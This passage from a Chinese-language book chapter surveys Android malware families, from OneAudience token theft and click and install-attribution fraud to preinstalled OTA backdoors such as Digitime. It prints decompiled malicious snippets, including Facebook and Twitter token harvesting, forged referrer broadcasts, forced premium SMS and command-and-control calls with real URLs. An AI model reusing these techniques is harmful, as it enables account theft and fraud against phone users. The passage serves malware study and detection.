OneAudience 访问 Twitter 和 Facebook 账户的技术细节揭示了一个所有流行操作系统中普遍存在的安全问题。现代应用程序通过将应用程序代码与许多附加 SDK 结合来构建。默认情况下，所有这些代码都在同一个进程中执行。进程内部没有安全边界，因为操作系统假设同一进程内的所有代码都是同等可信的。不幸的是，这种模型已经过时且不现实。恶意 SDK 存在，能够完全访问应用程序的其他 SDK 和核心代码。

列表 2-18，摘自应用程序*com.bestcoolfungames.cockroachsmasher*（v10617, 52f2），展示了 OneAudience SDK 如何通过反射访问用户的 Facebook 和 Twitter 信息。这个行为之所以可能，是因为 Facebook 和 Twitter SDK 与 OneAudience SDK 运行在相同的应用进程中。如果用户之前在应用程序中登录过 Twitter 或 Facebook，Twitter 和 Facebook SDK 中会包含他们的认证令牌。OneAudience 收集这些认证令牌，并利用它们偷偷连接到用户的 Twitter 和 Facebook 账户，抓取个人信息。

```
public static String getFacebookAccessToken() {
  Class[] v3_0 = new Class[0];
  try {
    Class v4_0 = Class.forName("com.facebook.AccessToken");
  } catch (Exception v0_2) {
    ...
  }

  if (v4_0 == null) {
    Method v0_5 = null;
  } else {
    v0_5 = v4_0.getDeclaredMethod("getCurrentAccessToken", v3_0);
  }
  ...
}

public String getSocialProfileJSON() {
  String v0_0 = "";
  String v1_0 = com.oneaudience.sdk.c.a.getFacebookAccessToken();
    if (v1_0 != null) {
      com.oneaudience.sdk.c.a.b v0_4 = new com.oneaudience.sdk.b().send(
        new com.oneaudience.sdk.i().getFacebookProfile(
          this.context, this.oneaudienceSharedPreferences, v1_0));
      ...
    }
    Object v1_3 = com.oneaudience.sdk.c.h.talkToTwitter();
    if (v1_3 == null) {
      String v1_4 = "";
    } else {
      v1_4 = this.extractJson(v1_3);
    }
    ...
    return this.extractJson(
      new com.oneaudience.sdk.model.SocialData(v0_0, v1_4));
}
```

*列表 2-18：OneAudience 使用反射访问 Twitter 和 Facebook 认证令牌。*

除了 Twitter 和 Facebook 的信息，OneAudience 还收集了用户的电子邮件地址、电话通话历史、联系人列表、位置、已安装的应用程序等更多信息。

#### ***Android.Click.312.origin***

2018 年，俄罗斯的杀毒公司 Dr. Web 发现了当年最大的点击欺诈家族。在 2019 年 8 月的博客文章《Doctor Web：某些 102,000,000 Android 用户从 Google Play 安装了 Clicker 木马》中，该公司为这一恶意软件家族起了一个不起眼的名字*Android.Click.312.origin*。这个通用名称低估了这个家族的重要性，它在 2019 年和 2020 年依然保持了显著影响力。

Android.Click.312.origin 是一个典型的点击欺诈 SDK。它使用高度混淆的类和变量名，并通过自定义加密方案加密所有字符串。列表 2-19 显示了来自应用*com.happylife.callflash*（v26，dca4）的摘录。

```
static {
    com.graver.data.f.b.a = com.graver.data.f.c.a("XnhueSZKbG5lfw==");
    com.graver.data.f.b.b = com.graver.data.f.c.a("Q39/e0NqZW9nbnk=");
    com.graver.data.f.c.a("Y39/e1luen5ueH8rYngrZX5nZyU=");
    com.graver.data.f.c.a("eW54fmd/K2J4K25me39y");
    com.graver.data.f.c.a("UH55ZzEueFYnUHlueH5nfzEueFY=");
    com.graver.data.f.c.a("eW56fm54f0dieH9uZW55K2J4K2V+Z2cneW54fmd/MS54J1B+eWdWMS54");
    ...
```

*列表 2-19：通过使用名称混淆和自定义字符串加密，Android.Click.312.origin 保护自己免受简单分析。*

在所有这些混淆和加密下，Android.Click.312.origin 其实很简单。在一段时间后，该 SDK 开始创建不可见的 WebView 对象，并执行 JavaScript 代码，欺诈性地点击广告。

#### ***猎豹移动***

2018 年 11 月，BuzzFeed 新闻发布了一篇名为《这些极受欢迎的安卓应用在用户背后进行广告欺诈》的文章，报道了美国广告公司 Kochava 发现的一种严重广告欺诈形式。文章指控中国移动应用开发公司猎豹移动通过一种名为*安装归因欺诈*的技术欺骗了合法的广告商。在 BuzzFeed 新闻的报道曝光后，猎豹移动被 Google Play 永久封禁。

安装归因欺诈是一种广告欺诈形式，它不依赖于欺诈性点击广告来赚钱。相反，它拦截安装归因过程，该过程决定了用户从广告安装应用时应归功于哪个广告商。在没有欺诈的情况下，展示广告的应用开发者会因用户安装广告应用而获得归因。但当涉及欺诈时，这一归因系统可以被重定向：欺诈代码拦截了归因，将其替换为伪造的归因，声称安装来自欺诈者的代码。这样，欺诈者会获得归因，而不是展示广告的合法应用的开发者。

在回应 BuzzFeed 新闻和 Kochava 的指控时，猎豹移动代表发布了一系列九篇博客文章，阐明了他们的观点。猎豹移动否认对欺诈行为负责，指责其应用中嵌入的多个 SDK 导致了欺诈行为——其中最著名的是三个 SDK，分别是 Batmobi、Duapps 和 Altamob，它们是由三家中国的移动广告公司开发的。

谁应为欺诈负责（以及不同方之间互相威胁的诉讼是否有实际发生）超出了本书的范围，但我们可以来看看欺诈是如何运作的。为了执行安装归因欺诈，这些 SDK 会持续监控来自 Google Play 的安装。在经过一些合理性检查以隐藏欺诈活动后，它们会广播`com.android.vending.INSTALL_REFERRER`消息，声称自己是新应用安装的来源。列表 2-20 展示了这一简单的欺诈技术。

```
while ((System.currentTimeMillis() - this.j) < this.h) { 
  Intent v0_5 = new Intent("com.android.vending.INSTALL_REFERRER");
  v0_5.setPackage(this.e);
  v0_5.setFlags(32);
  v0_5.putExtra("referrer", this.refData);
  this.ctx.sendBroadcast(v0_5);
  Thread.sleep(this.i);
}
```

*清单 2-20：该 SDK 发送安装推荐信息，欺诈性地声称自己是应用程序安装的来源。*

当然，涉及此案件的 SDK 并不是唯一一个进行安装归因欺诈的例子。像点击欺诈一样，这种方法在 Android 生态系统中非常普遍。广告提供商最好研究这一点，并采取措施保护自己的广告收入来源。

#### ***反欺诈 SDK***

2019 年，另一种有问题的 SDK 开始引起关注：金融反欺诈 SDK。嵌入金融应用程序（通常是个人贷款应用）中，这些 SDK 用于判断用户是否为合法用户。乍一看，这种做法似乎非常合理，旨在保护客户。问题在于，这些 SDK 从设备中收集的数据过多，已经触及间谍软件的范畴。例如，最大的此类 SDK 被 Android 安全团队称为“Loan Spy”，它滥用辅助功能 API 来访问 WhatsApp 信息，然后根据用户的 WhatsApp 使用情况判断是否为合法用户。

关于这些 SDK 的公开信息很少，但在 2019 年 10 月，中国新闻网站《中国财经网》报道，当局曾突袭科技公司同盾的办公室，调查与其中一项计划相关的情况。文章《中国打击恶意贷款和网络爬虫，淡马锡支持的同盾科技牵涉其中》写道：

作为全国范围内行动的一部分，执法机构也开始打击非法在线抓取个人数据的行为。非法收集和出售个人数据的行为是一个行业的公开秘密，几乎没有所谓的大数据公司能够逃脱这一“原罪”。

像它的竞争对手一样，Loan Spy 访问用户设备上的大量敏感信息：通话记录、短信、联系人列表、GPS 位置信息等等。然而，最令人担忧的是，Loan Spy 还滥用辅助功能 API 打破了 Android 应用之间的沙盒隔离。这个 API 包括屏幕阅读器、输入模拟等支持工具，它们忽视应用之间的沙盒隔离，能够与系统上的所有应用程序完全互动。

你可能会想，这些 SDK 怎么会广泛传播，如果它们只针对金融机构的应用程序？答案是，在东南亚，金融借贷的情况与西方世界截然不同。在 2020 年前的几年中，个人信用额度的需求急剧增加，导致了超过 10,000 款小型个人借贷应用程序的诞生，这些应用针对该地区的用户。这些应用都需要一种方法来判断是否在向虚假身份放贷，否则后续很难收回贷款。因此，Loan Spy 在 Android 设备上的存在感已与故意欺诈的恶意软件网络相媲美。

在 2023 年之前的几年里，使用这些个人贷款应用的用户普遍反映出了另一个问题。贷款公司会利用之前从设备中收集的个人数据，打电话威胁那些未按时还款的人，甚至是他们的朋友或家人。Google Play 政策团队在 2023 年 4 月做出了回应，禁止个人贷款应用请求与个人信息相关的 Android 权限，例如联系人列表、电话号码、照片或位置。未来，个人贷款应用将无法以任何理由使用这些权限。

#### ***Loapi/Podec***

在 2017 年以来，Google Play 外发现的两大恶意软件家族是 Loapi/Podec 和 HDC Bookmark。其中，Loapi/Podec 家族更为引人注目。俄罗斯安全公司卡巴斯基在 2015 年 3 月的一篇博客文章《SMS 木马绕过 CAPTCHA》中首次描述了 Podec。2017 年 12 月的一篇后续博客文章《多面手》将一种名为 Loapi 的新变种与 Podec 关联起来。

Loapi/Podec 可能最初是一个简单的 SMS 欺诈恶意软件，但随着时间的推移，它变成了一个强大的后门木马。根据卡巴斯基的说法，2015 版本（Podec）能执行来自指挥控制服务器的 16 个不同命令。虽然大多数命令与高级收费注册或普通的 SMS 或电话滥用相关，但有一个值得注意的命令是要求感染的设备执行针对提供目标的 DDoS 攻击。

2017 年的变种（Loapi）在 Podec 的基础上扩展了功能，采用了复杂的插件系统，可以根据来自指挥控制服务器的指令下载和执行额外的恶意模块。特别是，卡巴斯基指出该木马能够进行广告欺诈、Monero 加密货币挖矿等多种活动。

#### ***HDC Bookmark***

这一时期的第二大侧载恶意软件家族 HDC Bookmark 显得不那么复杂。其作者批量创建了数千个应用，包名以 *com.hdc.bookmark* 开头，结尾则是一个随机数字，例如 *com.hdc.bookmark52428*（v1, 1dda）。这些应用主要针对越南，似乎与 *apkfull.mobi* 这一越南网站有关，该网站存在于 2013 到 2018 年间，提供安卓应用和游戏的破解版本。这些 HDC Bookmark 应用提供了这些内容供用户下载，费用大约为 0.65 美元。

尽管起初可能颇具盈利性，但我们认为这个恶意软件家族并未取得长期的成功。这些应用没有防范检测机制，大多数常见的 Android 反恶意软件产品能够可靠地检测到它们。Android 操作系统现在也通过向用户显示警告来保护 SMS 订阅服务的注册过程，告知用户应用试图发送高额费用的信息。这或许解释了为什么 *apkfull.mobi* 网站在 2018 年消失。

然而，HDC 书签应用程序有一个隐蔽的功能，使得它们即使用户明确拒绝，也能发送收费短信。加密的资源文件，如*assets/map.lib*，包含以 JSON 格式的配置选项。当`url_config_auto_sms`选项被启用时，无论用户是否愿意为一个盗版应用支付 15,000 越南盾，应用都会发送收费短信。在清单 2-21 中，你可以看到该订阅对话框取消按钮的点击处理程序。

```
public void onClick(DialogInterface dialog, int which) {
  try {
    this.this$0.auto_sms = DownloadImage.instance.getAuto_sms2(
      com.hdc.service.Service_mLink.url_config_auto_sms);
  } catch (Exception v0) {
    this.this$0.auto_sms = "0";
  }
  if (!this.this$0.auto_sms.equals("1")) {
    dialog.dismiss();
    if (!Service_mLink.link_redirect.equals("")) {
      com.hdc.bookmark52428.MainActivity.access$3(
        this.this$0, Service_mLink.link_redirect);
    }
    System.exit(1);
  } else {
    if ((this.this$0.typeNetwork != "VIETNAM_MOBILE") 
      && (this.this$0.typeNetwork != "BEELINE")) {
      com.hdc.ultilities.SendSMS.send(
        com.hdc.service.Service_mLink.mo_Active,
        com.hdc.service.Service_mLink.svcodeActive,
        this.this$0, this.this$0.type_so);
    } else {
      com.hdc.ultilities.SendSMS.send(
      com.hdc.service.Service_mLink.mo_Active,
      com.hdc.service.Service_mLink.svcodeActive2,
      this.this$0, this.this$0.type_so);
    }
    ...
  }
}
```

*清单 2-21：无论用户选择如何，* com.hdc.bookmark52428 *(v1, 1dda) 都可以配置为始终发送收费短信。*

如果`auto_sms`被禁用，在用户拒绝该提议后，应用会退出。然而，如果`auto_sms`被启用，应用会检查设备使用的是哪个越南移动运营商，并发送收费短信。这种行为是欺诈行为。

#### ***EagerFonts***

预装恶意软件继续在低成本和无品牌设备上盛行。研究人员在新的安卓手机中发现了建立在间谍软件、不必要广告和付费安装推送应用程序计划上的商业模式。

有一个特别恶劣的预装恶意软件家族是 EagerFonts，它伪装成一个字体管理应用程序，在后台下载恶意模块。EagerFonts 的开发者说服了一家芯片组供应商将该应用包含在其开发 SDK 中。因此，所有使用该芯片组 SDK 的制造商的设备都被感染了。总的来说，EagerFonts 让超过 1200 万个设备受感染，涉及 1000 多款由数百家制造商生产的设备。

EagerFonts 突出了供应链妥协中的一个简单事实：妥协发生的上游越远，受感染的设备数量就越多。说服单一制造商在设备中包含恶意软件是有利可图的，但说服超过 100 家制造商的供应商这样做，就像中彩票一样。即使滥用行为被发现，任何恶意软件移除的努力都需要几个月的厂商协调，并且很可能会遗漏大量受感染的设备。在此期间，恶意软件将继续为其开发者带来收入。

Android 安全团队在 2019 年 BlackHat USA 大会上介绍了该恶意软件的技术细节，演讲题为“系统安全——深入分析反向工程安卓预装应用”。该演讲的幻灯片可以在互联网上免费获得。像大多数预装后门一样，EagerFonts 的主要目的是下载具有恶意功能的插件。它连接到一个命令与控制服务器*pushstablev9.ekesoo.com*，如清单 2-22 所示。这个域名主要托管一个色情网站。

```
public void run() {
  ArrayList v0_1 = new ArrayList();
  v0_1.add(new BasicNameValuePair("installationid",
    com.iekie.lovelyfonts.fonts.d.b.c(this.c)));
  v0_1.add(new BasicNameValuePair("channel", 
    com.iekie.lovelyfonts.fonts.d.b.b(this.c).d()));
  v0_1.add(new BasicNameValuePair("msgid", this.a));
  v0_1.add(new BasicNameValuePair("msg_type", this.b));
  v0_1.add(new BasicNameValuePair("type", 
    com.iekie.lovelyfonts.fonts.d.b.b(this.c).e()));
  v0_1.add(new BasicNameValuePair("appversion", 
    com.iekie.lovelyfonts.fonts.d.b.b(this.c).m()));
  v0_1.add(new BasicNameValuePair("status", "0"));
  try {
    new com.iekie.lovelyfonts.fonts.d.a(
      "http://pushstablev9.ekesoo.com/cloudfontapp/upgrademsgopen",
      v0_1).a(0);
  } catch (IOException v0_3) {
    v0_3.printStackTrace();
  }
  return;
}
```

*清单 2-22：EagerFonts 与其命令与控制服务器进行通信。*

除了用于下载和管理恶意插件的代码外，EagerFonts 几乎没有其他功能。下载的插件种类繁多，属于中国的恶意软件家族，如 Chamois 和 Snowfox（在本章前面已讨论）。

#### ***GMobi***

恶意软件开发者曾多次攻击预装应用供应链中的一个特定部分：第三方的无线 OTA（空中下载）更新提供商。OTA 更新软件用于下载并安装 Android 设备的系统更新，无论是较小的每月安全更新，还是新的 Android 版本。安装这些更新要求 OTA 软件对 Android 系统进行深层次更改，因此它拥有一些最高的权限。这种高度特权的位置使其成为 Android 恶意软件开发者的主要攻击目标。

制造商通过几种策略管理和分发设备更新。像三星和小米这样的公司管理自己的 OTA 更新基础设施和软件。谷歌提供 GOTA，这是一个免费的 OTA 分发和管理解决方案，适用于安装了 Google Play 服务的设备。那些不能或不愿使用 GOTA 的制造商，可以从大约十几家商业 OTA 解决方案提供商中选择。经过一系列的安全问题后，研究人员开始调查这些商业 OTA 提供商。

我们要考虑的第一个 OTA 提供商是总部位于台北的通用移动公司（GMobi）。关于 GMobi 的 OTA 应用程序的担忧首次曝光是在 2016 年 3 月，当时俄罗斯安全公司 Dr. Web 发布了一篇博客文章，名为“新的广告软件攻击了知名公司发布的固件和应用程序”。Dr. Web 的研究人员指出了诸如数据收集（例如收集用户的电子邮件地址和 GPS 位置）、显示不必要的广告和在未经用户同意的情况下安装新应用程序等功能。特别是，安装应用程序的能力导致了恶意软件事件：例如，在 2015 年 10 月，GMobi 在近百万台设备上安装了一个 Ghost Push 应用。

几个月前，在 2015 年 1 月，《Tech in Asia》文章描述了 GMobi 的商业模式。文章标题为“认识这家在数百万新兴市场智能手机上安装臃肿软件的公司”，内容如下：

重要的是要记住，每一款臃肿软件背后都可能有一场艰难的握手。通过共同同意入侵你的智能手机，应用发布商获得了用户覆盖，智能手机品牌则获得了现金。GMobi 是一家总部位于台湾的初创公司，通过促进这些“握手”来赚钱。四年来，该公司一直在为几十个智能手机品牌提供预装服务、构建白标应用商店并推动固件更新。

其他商业 OTA 提供商可能通过安装应用程序和展示广告获得收入，从而推动它们的利润。OTA 功能只是建立深入 Android 系统钩子的手段。

其他安全公司也注意到了 GMobi。德国的杀毒公司 Avira 在 2016 年 4 月的一篇博客文章中描述了 GMobi 的广告软件问题，文章名为“Trojan Adware Hits Budget Androids—And Some Well-Known Apps”。2018 年 7 月，《华盛顿邮报》的一篇文章《应用陷阱：廉价智能手机如何在发展中国家窃取用户数据》使用了英国公司 Upstream Systems 的研究，进一步审视了 GMobi 的数据收集行为。

#### ***Adups***

另一家有记录的、安全问题突出的 OTA 供应商是总部位于上海的 Adups。2016 年 10 月，安全公司 Kryptowire 曝光了 Adups OTA 软件中的间谍行为。其报告《Android 固件未经同意共享私人数据》指出，Adups 软件收集了短信、联系人信息和设备的通话记录，包括完整的电话号码。

和 GMobi 一样，Adups 软件也可以在没有用户同意的情况下下载和安装其他应用程序。关于这一功能的第一个公开证据可以追溯到至少 2015 年 1 月，当时一位 Reddit 用户在*/r/india*版块发布了以下内容：

我使用的是 Micromax A093 Canvas fire，自去年 8 月起一直在使用。[ . . . ] 与此同时，看来 Micromax 正在未经我允许安装应用程序，占用了宝贵的空间和我的 3G 流量！这些应用程序在卸载后又重新出现。这真是荒谬！很多时候，它不仅下载应用程序，还创建 8-10 条通知，这些通知是在线商店和其他应用程序的广告。

Adups 继续增强这些功能，下载并安装了组成大型中国僵尸网络的应用程序，如 Ghost Push 和 Snowfox。Adups 的某些版本引起了安全研究人员的极大关注，以至于美国的国防非营利组织 MITRE 公司现在将其列入 MITRE ATT&CK 框架，这是一个业界标准的恶意软件战术和技术库。

#### ***Redstone***

另一家有安全问题历史的 OTA 公司是位于北京的 Redstone Sunshine。2021 年 4 月，美国反恶意软件公司 Malwarebytes 在一篇名为“Pre-Installed Auto Installer Threat Found on Android Mobile Devices in Germany”的文章中对 Redstone 表达了关注。该文章在科技媒体中引起了广泛关注。例如，德国最大的计算机杂志《Computer Bild》报道了这一事件，德国信息安全局（Bundesamt für Sicherheit in der Informationstechnik）也向受影响的德国用户发出了警告。

2021 年 11 月，Dr. Web 描述了一系列影响 Elari Kidphone 4G 智能手表的数据收集问题和隐藏应用安装。标题为《Doctor Web 发现儿童智能手表中的漏洞》的博客文章描述了 OTA 组件如何被用于“网络间谍活动、显示广告和安装不需要的甚至恶意的应用程序”。Dr. Web 在文章中没有提到 Redstone，但文章中提到的许多恶意文件属于 Redstone 的 OTA 解决方案。通过查看展示文件的应用签名信息，可以验证这一点。

#### ***Digitime***

Digitime 是一家来自中国深圳的公司，直到 2019 年才引起专业安全界和科技媒体的注意。那一年，一位名为 Ninji 的独立安全研究员记录了 Digitime 的 OTA 更新软件功能问题。在 12 月的博客文章《研究 Digitime Tech FOTA 后门》中，Ninji 描述了 Digitime 广泛的基于 Lua 的插件系统，该系统下载具有问题功能的附加模块。举例来说，包括能够在设备上安装和卸载任何应用程序，并在不使用权限提示的情况下授予它们任何权限。

半年后，Digitime 的 OTA 更新软件引起了公众关注。Malwarebytes 识别出一款由中国公司 TeleEpoch 制造、以中国设备制造商 Unimax 品牌销售、并由美国移动运营商 Assurance Wireless 销售的低成本设备 UMX U683CL 存在安全和隐私问题。尽管涉及的是不太知名的制造商，但这一设备型号值得关注。它是美国联邦计划 Lifeline 的一部分，该计划旨在降低符合条件的美国公民的电话和互联网服务月费。揭露这款中国制造的设备具有后门和间谍软件功能，引发了国家媒体的轰动，尽管 Digitime 暂时未受到影响；Malwarebytes 错误地将该 OTA 软件归咎于 Adups。然后，在 2020 年 7 月，一位匿名贡献者以 Concerned_Citizen 为名，在公共 Malwarebytes 论坛发布了一篇名为《Lifeline 手机上的预装恶意软件》的帖子，解释了他们如何使用 Ninji 的逆向工程指南分析软件的 Lua 代码，并发现真正的开发公司是 Digitime。

随着时间的推移，Digitime 建立了一个越来越复杂的混淆和加密方案，用以隐藏其基于 Lua 的插件引擎。像 *com.qiot.update*（v1032，4529）这样的最新版本首次出现在 2019 年 9 月，并安装在如 Oukitel C22 和 Okapi 10 Pro 等设备上。在这些设备上，Digitime 通过添加名为 *com.internal.jar.pl.** 的非标准包来修改 Android 系统组件 *frameworks.jar* 文件。这些包中的代码调用位于 */system/lib64/libpowerhalwrap_jni.so* 的本地 ELF 库。在通过各种反分析检查后，ELF 库会丢弃两个 DEX 文件和一个包含标准 Lua 框架的 ZIP 文件。

Lua 解释器被静态链接到 ELF 库中，并进行了一些巧妙的修改：`luaL_loadfile` 方法，负责加载 Lua 脚本，被修改为加载通过简单的 XOR 算法加密的非标准 Lua 文件。因此，在提取 Lua 脚本后，分析师必须先解密它们，然后才能将其加载到像 LuaDec 这样的 Lua 逆向工程工具中。幸运的是，加密算法很简单。修改后的 *luaL_loadfile* 方法使用的 XOR 填充可以通过 列表 2-23 中的 Python 代码创建。

```
function create_key:
  output = [0x00 .. 0xff];
  a = 1; b = 1;
  for i = 1 to 500:
    a = (a + b) & 0xff;
    b = (a + b) & 0xff;
    swap(output[a], output[b]);
  return output;
```

*列表 2-23：用于解密 Digitime 加密 Python 脚本的 Python 代码*

如果 Lua 脚本成功执行，它们将与位于*http://rp1.androidevlog.com:10000/inf_v20*的指挥与控制服务器进行通信，以接收配置选项并下载更多 Lua 模块。它们从像*google-global.com*、*facebook-3rd.com*、*bugreportsync.com*、*flurrydata.com* 和 *gmscenter.org* 等域名下载恶意插件，这些域名伪装成 Android 生态系统中的合法公司，可能是为了欺骗阅读日志文件或源代码的安全研究人员。

有关 Digitime 软件的技术能力及其随时间演变的更多信息，已由 Android 安全团队在 2022 年 Virus Bulletin 和 2023 年 BotConf 大会上发布，内容包括两场名为“你 OTA 知道吗：打击恶意 Android 系统更新程序”的演讲。

### **接下来**

本章回顾了 10 年来在野外发现的 Android 恶意软件。虽然并不详尽，但这里介绍的家族、样本和特性作为 Android 恶意软件的有用示例，展示了其外观和运作方式。书的其余部分描述了如何检测和分析此类恶意软件。

[*OceanofPDF.com*](https://oceanofpdf.com)
